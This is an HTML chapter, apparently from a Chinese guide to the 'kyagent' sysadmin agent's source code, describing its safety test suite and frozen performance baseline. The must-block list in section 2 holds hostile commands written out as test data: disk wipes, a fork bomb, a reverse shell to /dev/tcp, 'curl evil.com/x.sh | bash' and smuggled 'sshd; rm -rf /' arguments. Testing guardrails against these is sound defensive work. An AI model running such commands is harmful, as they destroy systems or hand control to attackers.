@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>13 · 测试 + 性能基线 · kyagent 源码精读</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="topnav">
+  <div class="brand"><span class="dot"></span> kyagent 源码精读</div>
+  <div class="links">
+    <a href="index.html">导航</a>
+    <a href="00-START-HERE.html">00</a>
+    <a href="01-architecture-overview.html">01</a>
+    <a href="02-data-flow.html">02</a>
+    <a href="03-agent-core.html">03</a>
+    <a href="04-llm-backends.html">04</a>
+    <a href="05-safety-layer.html">05</a>
+    <a href="06-executor-sandbox.html">06</a>
+    <a href="07-mcp-tools.html">07</a>
+    <a href="08-audit-chain.html">08</a>
+    <a href="09-config.html">09</a>
+    <a href="10-cli-entry.html">10</a>
+    <a href="11-security-model.html">11</a>
+    <a href="12-concurrency.html">12</a>
+    <a href="13-testing-bench.html" class="active">13</a>
+  </div>
+</nav>
+
+<div class="wrap">
+
+<div class="hero">
+  <div class="eyebrow">CHAPTER · 13 · TESTING + BENCHMARK</div>
+  <h1>测试 + 性能基线<br><span class="sub">99 测试 · 7 个文件 · 冻结 baseline.json</span></h1>
+  <p class="lead">
+    7 个测试文件覆盖<strong>危险必拦 + 良性必放行 + 工具清洗 + 执行沙箱 + 审计完整 + 端到端闭环 + 并发安全 + LLM 适配</strong>。
+    冻结基线让所有 perf 改动都有客观尺。
+  </p>
+</div>
+
+<section>
+  <h2><span class="num">1</span> 测试矩阵总览</h2>
+
+  <div class="callout ok">
+    <span class="icon">99</span>
+    <div class="body">
+      <strong>99 passed / 2 skipped</strong>（POSIX-only 在 Windows 上跳过）
+    </div>
+  </div>
+
+  <div class="filetree">
+<span class="dir">tests/</span>
+├── <span class="file">test_safety.py</span>           <span class="star">★</span> <span class="cmt">必拦 30+ / 必放行 14+ / declared_risk 下限</span>
+├── <span class="file">test_executor.py</span>         <span class="cmt">empty_argv / windows_mock / posix_echo / posix_timeout /</span>
+│                            <span class="cmt">LD_PRELOAD 过滤 / PATH 限制 / sudo wrap / forbid_root</span>
+├── <span class="file">test_mcp.py</span>              <span class="cmt">registry / MCP shape / 参数校验 / shell-meta 拒绝 /</span>
+│                            <span class="cmt">forbidden unit / shadow read 拒绝</span>
+├── <span class="file">test_audit.py</span>            <span class="cmt">7 段链 / JSONL 追加 / list 倒序 / 按 kind 检索 /</span>
+│                            <span class="cmt">序列化并发测试（H2 锚点）</span>
+├── <span class="file">test_integration.py</span>      <span class="cmt">端到端：mock 后端跑通 + 高风险被拒 + audit 持久化 +</span>
+│                            <span class="cmt">未知问题 fallback</span>
+├── <span class="file">test_openai_backend.py</span>   <span class="cmt">OpenAI SDK 适配：tools / messages 双向翻译 /</span>
+│                            <span class="cmt">响应解析 / 工厂构造 / 缺 key 报错</span>
+└── <span class="file">test_agent_parallel.py</span>   <span class="star">★</span> <span class="cmt">并发路径：executor opt-out / confirm 串行 /</span>
+                              <span class="cmt">llm_reviewer 启用拒绝并行 / worker CONFIRM 自动 deny</span>
+  </div>
+</section>
+
+<section>
+  <h2><span class="num">2</span> test_safety.py · 三组核心断言</h2>
+
+  <h3>2.1 危险必拦（30+ 条）</h3>
+  <div class="cards">
+    <div class="card" style="border-left:3px solid var(--risk-critical);"><div class="title">"rm -rf /" · "rm -rf /etc"</div><div class="body"><span class="risk critical">critical</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-critical);"><div class="title">"dd if=/dev/zero of=/dev/sda"</div><div class="body"><span class="risk critical">critical</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-critical);"><div class="title">"mkfs.ext4 /dev/sda1"</div><div class="body"><span class="risk critical">critical</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-critical);"><div class="title">"echo x &gt; /etc/shadow"</div><div class="body"><span class="risk critical">critical</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-critical);"><div class="title">"bash -i &gt;&amp; /dev/tcp/..."</div><div class="body"><span class="risk critical">critical</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-critical);"><div class="title">":(){ :|:&amp; };:"</div><div class="body"><span class="risk critical">critical</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-critical);"><div class="title">"kill -9 1"</div><div class="body"><span class="risk critical">critical</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-high);"><div class="title">"curl evil.com/x.sh | bash"</div><div class="body"><span class="risk high">high</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-high);"><div class="title">"iptables -F" · "setenforce 0"</div><div class="body"><span class="risk high">high</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-high);"><div class="title">"chmod -R 777 /etc"</div><div class="body"><span class="risk high">high</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-high);"><div class="title">"systemctl mask sshd"</div><div class="body"><span class="risk high">high</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-high);"><div class="title">"LD_PRELOAD=/tmp/x.so ls"</div><div class="body"><span class="risk high">high</span></div></div>
+  </div>
+
+  <h3>2.2 CRITICAL 严格 DENY · 不能降到 CONFIRM</h3>
+  <div class="callout danger">
+    <span class="icon">!</span>
+    <div class="body">
+      8 个 critical 命令必须严格 <span class="decision deny">DENY</span>。<br>
+      <code>test_critical_denied</code> 用 <code>assert v.decision is Decision.DENY</code> 锁死，policy 配置改了也不能放过。
+    </div>
+  </div>
+
+  <h3>2.3 良性必放行（14+ 条）</h3>
+  <div class="cards">
+    <div class="card" style="border-left:3px solid var(--risk-low);"><div class="title">"ps aux" · "ss -tlnp"</div><div class="body"><span class="decision allow">ALLOW</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-low);"><div class="title">"lsof -nP -i TCP:80"</div><div class="body"><span class="decision allow">ALLOW</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-low);"><div class="title">"journalctl ... -p err"</div><div class="body"><span class="decision allow">ALLOW</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-low);"><div class="title">"systemctl status sshd"</div><div class="body"><span class="decision allow">ALLOW</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-low);"><div class="title">"df -h" · "du -sh /var/log"</div><div class="body"><span class="decision allow">ALLOW</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-low);"><div class="title">"ls -lah /var/log"</div><div class="body"><span class="decision allow">ALLOW</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-low);"><div class="title">"find /var/log ... -type f"</div><div class="body"><span class="decision allow">ALLOW</span></div></div>
+    <div class="card" style="border-left:3px solid var(--risk-low);"><div class="title">"dnf list installed"</div><div class="body"><span class="decision allow">ALLOW</span></div></div>
+  </div>
+
+  <h3>2.4 边界用例</h3>
+  <div class="bullets">
+    <div class="bul ok"><span class="b-num">1</span><div><code>rm -rf /tmp/build-cache</code> → <span class="decision allow">ALLOW</span>（/tmp 不在保护列表）</div></div>
+    <div class="bul ok"><span class="b-num">2</span><div><code>rm '-rf' '/etc'</code>（带引号）→ <span class="decision deny">DENY</span>（shlex 切词后仍要识别）</div></div>
+    <div class="bul ok"><span class="b-num">3</span><div><code>rm -rf /usr</code> → 同时命中 rm-recursive-system + dangerous-rm-pattern</div></div>
+    <div class="bul ok"><span class="b-num">4</span><div>declared HIGH 抬升 → <span class="decision confirm">CONFIRM</span></div></div>
+    <div class="bul danger"><span class="b-num">5</span><div><code>rm -rf /etc</code> + declared LOW → <span class="decision deny">DENY</span>（不降级）</div></div>
+  </div>
+</section>
+
+<section>
+  <h2><span class="num">3</span> test_executor.py · 8 个测试</h2>
+  <pre class="diagram">
+test_empty_argv_rejected            <span class="cmt"># 空 argv → skipped_reason="empty_argv"</span>
+test_windows_mock_mode              <span class="cmt"># win32 only · 返回 mock stdout</span>
+test_posix_echo                     <span class="cmt"># posix only · echo hello → rc=0</span>
+test_posix_timeout                  <span class="cmt"># posix only · sleep 10 with timeout=2s → timed_out=True</span>
+test_clean_env_blocks_ld_preload    <span class="hi2"># LD_PRELOAD 必须被过滤</span>
+test_clean_env_restricts_path       <span class="hi2"># PATH 必须只含白名单</span>
+test_sudo_wrap_for_root_when_allowed <span class="cmt"># sudo -n -u root -- ...</span>
+test_forbid_root_returns_false_command <span class="hi2"># forbid_root → ["/bin/false"]</span></pre>
+</section>
+
+<section>
+  <h2><span class="num">4</span> test_mcp.py · 10 个测试</h2>
+  <pre class="diagram">
+<span class="hi3"># 工具注册完整性</span>
+test_default_registry_has_core_tools
+test_to_mcp_list_shape                       <span class="cmt"># MCP 字段 inputSchema</span>
+test_anthropic_tools_shape                   <span class="cmt"># Anthropic 字段 input_schema</span>
+
+<span class="hi3"># 参数清洗</span>
+test_validate_required_args_missing
+test_validate_coerces_string_to_int          <span class="cmt"># "80" → 80</span>
+
+<span class="hi2"># 安全锚点</span>
+test_svc_restart_rejects_shell_metacharacters <span class="cmt"># sshd; rm -rf /</span>
+test_svc_restart_rejects_forbidden_unit       <span class="cmt"># systemd-logind</span>
+test_find_rejects_shell_meta_in_name          <span class="cmt"># *.log; rm -rf /</span>
+test_filesystem_blocks_shadow_read            <span class="cmt"># /etc/shadow</span></pre>
+</section>
+
+<section>
+  <h2><span class="num">5</span> test_audit.py · 5 个测试</h2>
+  <div class="bullets">
+    <div class="bul"><span class="b-num">1</span><div><strong>test_full_reasoning_chain_persisted</strong> · 写 7 段 → seq 严格 1..7 + 第 0 是 USER_INPUT + 最后是 AGENT_REPLY</div></div>
+    <div class="bul"><span class="b-num">2</span><div><strong>test_jsonl_appended</strong> · 一个 event → JSONL 一行</div></div>
+    <div class="bul"><span class="b-num">3</span><div><strong>test_list_traces_orders_by_recency</strong> · 倒序</div></div>
+    <div class="bul"><span class="b-num">4</span><div><strong>test_filter_events_by_kind</strong> · 按 kind 过滤</div></div>
+    <div class="bul danger"><span class="b-num">5</span><div>★ <strong>test_audit_event_serializes_shared_trace_updates</strong> · H2 锚点 · 并发序列化（详见 12-concurrency）</div></div>
+  </div>
+</section>
+
+<section>
+  <h2><span class="num">6</span> test_integration.py · 端到端</h2>
+  <pre class="diagram">
+test_low_risk_query_flows_through
+  <span class="cmt"># 问 CPU 占用 → process_list → ALLOW → 执行 → 审计完整</span>
+  <span class="hi3">7 段事件必须全部出现</span>
+
+test_high_risk_tool_denied_in_oneshot
+  <span class="cmt"># 重启 nginx → svc_restart 声明 HIGH → confirm=lambda*a:False → denied=True</span>
+
+test_agent_audit_persistence
+  <span class="cmt"># 跑完 ask → 从 SQLite 取回完整事件流</span>
+
+test_unknown_query_fallback
+  <span class="cmt"># 无法路由的提问应得到 mock 兜底文本，不应崩</span></pre>
+</section>
+
+<section>
+  <h2><span class="num">7</span> test_agent_parallel.py · 并发路径</h2>
+  <pre class="diagram">
+test_posix_executor_that_disallows_threaded_tools_runs_multi_tool_turn_serially
+  <span class="cmt"># executor opt-out 时多工具回合走串行 → executor 全部在 MainThread</span>
+
+test_confirm_required_tools_do_not_enter_parallel_path
+  <span class="cmt"># CONFIRM 工具不进并行路径 → confirm 在 MainThread、executor 不被调用</span>
+
+<span class="hi">test_is_parallel_safe_rejects_when_llm_reviewer_enabled</span>  <span class="cmt"># ★ C2 第一道</span>
+  <span class="cmt"># reviewer 启用时 _is_parallel_safe 返回 False</span>
+
+<span class="hi">test_handle_tool_use_denies_confirm_off_main_thread</span>  <span class="cmt"># ★ C2 第二道</span>
+  <span class="cmt"># worker 拿到 CONFIRM → 自动 deny + ERROR 事件</span></pre>
+</section>
+
+<section>
+  <h2><span class="num">8</span> 冻结性能基线</h2>
+
+  <div class="callout danger">
+    <span class="icon">FROZEN</span>
+    <div class="body">
+      <code>benchmarks/bench_ask.py</code> 文件开头明确写："<strong>DO NOT MODIFY THIS FILE AFTER BASELINE IS CAPTURED</strong>"。
+      任何对该文件的修改都会让 baseline.json 失效，因为对比必须用同一个 workload。
+    </div>
+  </div>
+
+  <h3>8.1 冻结 workload</h3>
+  <div class="kv">
+    <div class="k">warmup</div><div class="v">5 ask 迭代（不计时）</div>
+    <div class="k">timed</div><div class="v">50 ask 迭代：30 单工具 LOW 风险 + 20 多工具回合（每轮 3 个 LOW）</div>
+    <div class="k">guardrail micro</div><div class="v">2000 次 check_argv</div>
+    <div class="k">audit micro</div><div class="v">1000 次 event 写入</div>
+    <div class="k">计时</div><div class="v">time.perf_counter_ns + time.process_time_ns</div>
+  </div>
+
+  <h3>8.2 baseline.json（冻结）</h3>
+<pre><code>{
+  "schema": "kyagent-bench-v1",
+  "python": "3.12.10",
+  "platform": "win32",
+  "ask": {
+    "n": 50,
+    "p50_ns": 9285600,
+    "p95_ns": 21934000,
+    "mean_ns": 10167752,
+    "min_ns": 4985700,
+    "max_ns": 37707500,
+    "total_cpu_ns": 234375000
+  },
+  "guardrail": {
+    "n": 2000,
+    "p50_ns": 21900,
+    "p95_ns": 33500,
+    "mean_ns": 23757
+  },
+  "audit": {
+    "n": 1000,
+    "total_ns": 607302900,
+    "mean_ns": 607302
+  }
+}</code></pre>
+
+  <h3>8.3 通过准则</h3>
+  <div class="bullets">
+    <div class="bul"><span class="b-num">1</span><div><code>ask_p50_new &lt;= 0.75 × baseline ask_p50</code> （≥25% 中位数下降）</div></div>
+    <div class="bul"><span class="b-num">2</span><div><code>ask_p95_new &lt;= baseline ask_p95</code> （p95 不退化）</div></div>
+    <div class="bul"><span class="b-num">3</span><div><code>guardrail_p50_new &lt;= 0.75 × baseline guardrail_p50</code></div></div>
+    <div class="bul"><span class="b-num">4</span><div><code>audit_total_new &lt;= 0.75 × baseline audit_total</code></div></div>
+    <div class="bul"><span class="b-num">5</span><div>pytest 全过</div></div>
+  </div>
+
+  <h3>8.4 commit e276c77 实际优化结果（连跑三次）</h3>
+  <table>
+    <thead><tr><th>指标</th><th>1st run</th><th>2nd run</th><th>3rd run</th><th>地板</th><th>结果</th></tr></thead>
+    <tbody>
+      <tr><td>ask_p50</td><td>-31.7%</td><td>-33.1%</td><td>-39.3%</td><td>-25%</td><td><span class="decision allow">PASS</span></td></tr>
+      <tr><td>ask_p95</td><td>-10.1%</td><td>-11.8%</td><td>-19.6%</td><td>no regression</td><td><span class="decision allow">PASS</span></td></tr>
+      <tr><td>guardrail_p50</td><td><strong>-91.3%</strong></td><td><strong>-91.3%</strong></td><td><strong>-90.9%</strong></td><td>-25%</td><td><span class="decision allow">PASS</span></td></tr>
+      <tr><td>audit_total</td><td>-34.6%</td><td>-35.5%</td><td>-37.2%</td><td>-25%</td><td><span class="decision allow">PASS</span></td></tr>
+    </tbody>
+  </table>
+
+  <h3>8.5 五个优化改动来源</h3>
+  <div class="cards">
+    <div class="card accent">
+      <div class="label">OPT · 1</div>
+      <div class="title">safety/rules.py</div>
+      <div class="body">进程级 LRU 缓存 → <strong>guardrail p50 -91%</strong></div>
+    </div>
+    <div class="card accent">
+      <div class="label">OPT · 2</div>
+      <div class="title">audit/logger.py</div>
+      <div class="body">JSONL line-buffered 常驻 fd → <strong>audit total -35%</strong></div>
+    </div>
+    <div class="card accent">
+      <div class="label">OPT · 3</div>
+      <div class="title">executor/proxy.py</div>
+      <div class="body">which / env_template / preexec 三件缓存</div>
+    </div>
+    <div class="card accent">
+      <div class="label">OPT · 4</div>
+      <div class="title">agent/core.py</div>
+      <div class="body">并行多工具调度脚手架（dormant · 未来扩展点）</div>
+    </div>
+    <div class="card accent">
+      <div class="label">OPT · 5</div>
+      <div class="title">agent/llm.py</div>
+      <div class="body">Anthropic prompt cache → <strong>TTFT -13~31% · input token -41~80%</strong></div>
+    </div>
+  </div>
+
+  <div class="callout ok">
+    <span class="icon">NOTE</span>
+    <div class="body">
+      <strong>baseline -34% p50 完全不依赖并行路径</strong>（详见 README.kyagent.md §6.5）。
+      并行路径是冻结基线之后的「未来扩展脚手架」，gate 死。
+    </div>
+  </div>
+</section>
+
+<section>
+  <h2><span class="num">9</span> 跑测试 / 跑基线速查</h2>
+
+<pre><code># 全部测试（99 通过，POSIX-only 在 Windows 上 2 个 skip）
+python -m pytest -q
+
+# 跑某个模块
+python -m pytest tests/test_safety.py -v
+
+# 跑某个用例
+python -m pytest tests/test_safety.py::test_dangerous_blocked -v
+
+# 跑 perf benchmark + 与冻结基线对比
+python benchmarks/bench_ask.py
+
+# 重新捕获基线（基线被冻结，不应该用这个）
+python benchmarks/bench_ask.py --save-baseline</code></pre>
+
+  <p>测试用 <code>pytest --basetemp pytest_tmp -p no:cacheprovider</code> 可以避免在仓库根创建 <code>.pytest_cache</code>。</p>
+</section>
+
+<section>
+  <h2><span class="num">10</span> CI 矩阵建议</h2>
+<pre><code>strategy:
+  matrix:
+    os: [ubuntu-latest, windows-latest]
+    python: [3.11, 3.12]
+
+steps:
+  - run: pip install -e .
+  - run: pytest -q                           # 期望 99 passed / 2 skipped on win
+  - run: ruff check kyagent/ tests/          # 期望 All checks passed
+  - run: python benchmarks/bench_ask.py      # 期望 Overall: PASS</code></pre>
+</section>
+
+<section>
+  <h2><span class="num">11</span> 关键不变量</h2>
+  <div class="bullets">
+    <div class="bul ok"><span class="b-num">1</span><div><strong>99 个测试在 Windows 上 99 passed / 2 skipped</strong>；Linux 上 99 passed</div></div>
+    <div class="bul ok"><span class="b-num">2</span><div><strong>baseline.json 是冻结的</strong>：任何修改要更新 frozen 行为前必须同步改 bench_ask.py 注释</div></div>
+    <div class="bul ok"><span class="b-num">3</span><div><strong>C2 修复后的 reviewer-enabled gate 不能去掉</strong>：tests/test_agent_parallel.py 锁死</div></div>
+    <div class="bul ok"><span class="b-num">4</span><div><strong>危险命令必拦 + 良性命令必放行</strong>：30+ / 14+ 两条 parametrize 列表是底线</div></div>
+    <div class="bul ok"><span class="b-num">5</span><div><strong>Tool.build_argv 的 shell-meta 拒绝</strong>：test_mcp.py 三条用例锁死</div></div>
+  </div>
+</section>
+
+<section>
+  <h2><span class="num">12</span> 阅读路线完成 · 14 份文档总览</h2>
+  <p>读完之后回去摸一遍源码 / 跑一遍测试 / 跑一遍 bench，整个项目就是你的了。</p>
+
+  <h3>跨文档的"互锁"理解</h3>
+  <div class="bullets">
+    <div class="bul ok"><span class="b-num">1</span><div><strong>declared_risk 是下限不是上限</strong>（05 + 03）— 工具声明 HIGH 永远只能向上抬</div></div>
+    <div class="bul ok"><span class="b-num">2</span><div><strong>每个工具调用必经 7 段事件</strong>（02 + 03 + 08）— TOOL_REQUEST/SAFETY_CHECK/EXECUTION/EXECUTION_RESULT 强制</div></div>
+    <div class="bul ok"><span class="b-num">3</span><div><strong>Tool.build_argv 必返回 list[str]，永远不调 shell</strong>（06 + 07）— shell 注入免疫的物理基础</div></div>
+    <div class="bul ok"><span class="b-num">4</span><div><strong>self.confirm() 永远只在主线程</strong>（03 + 12）— C2 两道防线确保不在 worker 抢 stdin</div></div>
+    <div class="bul ok"><span class="b-num">5</span><div><strong>同一 trace 内事件落盘顺序 = seq 顺序</strong>（08 + 12）— trace._lock 保证</div></div>
+    <div class="bul ok"><span class="b-num">6</span><div><strong>生产环境当前不走并行</strong>（06 + 12）— C1 gate 死，留作 posix_spawn 扩展点</div></div>
+    <div class="bul ok"><span class="b-num">7</span><div><strong>多层独立失效不耦合</strong>（11）— 任意一层被绕过都不会让攻击成功</div></div>
+  </div>
+</section>
+
+<div class="footnav">
+  <a href="12-concurrency.html">
+    <div class="dir">← 上一章</div>
+    <div class="ttl">12 · 并发模型</div>
+  </a>
+  <a href="index.html" class="next">
+    <div class="dir">回到 →</div>
+    <div class="ttl">导航首页</div>
+  </a>
+</div>
+
+</div>
+</body>
+</html>
